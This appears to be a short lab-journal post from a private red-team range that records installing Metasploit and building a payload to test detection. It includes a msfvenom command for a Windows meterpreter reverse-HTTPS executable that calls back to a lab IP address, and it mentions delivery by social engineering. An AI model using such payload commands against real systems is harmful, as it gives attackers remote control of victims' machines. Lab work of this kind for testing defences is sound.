---
title: "OPF-RED01 Metasploit Setup & Payload Generation"
date: 2025-05-26
draft: false
tags: ["opf-red01", "metasploit", "payloads", "redteam"]
---

## Metasploit Installed

Metasploit was installed using the official `msfinstall` script:

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb -o msfinstall
chmod 755 msfinstall
sudo ./msfinstall
```

Confirmed with:

```bash
msfconsole --version
```

---

## Payload Generation

The following payload was created for C2 operations within the DMZRED segment:

```bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https \
  LHOST=192.168.22.50 LPORT=8443 \
  -f exe -o shell.exe
```

Payload was moved to:

```bash
/opt/opforge/redteam/payloads/shell.exe
```

File properties:

```bash
file shell.exe
sha256sum shell.exe
```

The payload is now ready to be staged from OPF-RED01 or delivered via social engineering as part of a detection validation scenario.

---

## Next Steps

- Set up listener in `msfconsole`
- Deploy payload to `opf-mbr01`
- Monitor detection in `opf-blue01`, `opf-ai01`, or via Winlogbeat pipeline
